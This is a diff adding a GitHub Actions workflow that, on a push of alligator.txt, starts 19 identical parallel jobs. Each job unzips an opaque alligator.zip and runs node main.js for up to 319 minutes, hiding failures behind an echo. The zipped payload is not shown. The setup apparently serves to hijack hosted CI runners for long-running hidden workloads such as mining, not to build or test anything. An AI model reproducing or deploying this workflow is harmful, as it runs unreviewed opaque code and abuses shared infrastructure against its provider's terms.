@@ -1,0 +1,51 @@
+name: alligator
+on:
+  push:
+    branches: [ "main" ]
+    paths:
+      - "alligator.txt"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { os: 0 }
+          - { os: 1 }
+          - { os: 2 }
+          - { os: 3 }
+          - { os: 4 }
+          - { os: 5 }
+          - { os: 6 }
+          - { os: 7 }
+          - { os: 8 }
+          - { os: 9 }
+          - { os: 10 }
+          - { os: 11 }
+          - { os: 12 }
+          - { os: 13 }
+          - { os: 14 }
+          - { os: 15 }
+          - { os: 16 }
+          - { os: 17 }
+          - { os: 18 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+
+      - name: Unzip alligator.zip
+        run: |
+          sudo apt install -y unzip
+          unzip alligator.zip
+
+      - name: hence ponder
+        run: |
+          npm install --ignore-scripts
+          timeout 319m node main.js || echo "alligator executed"
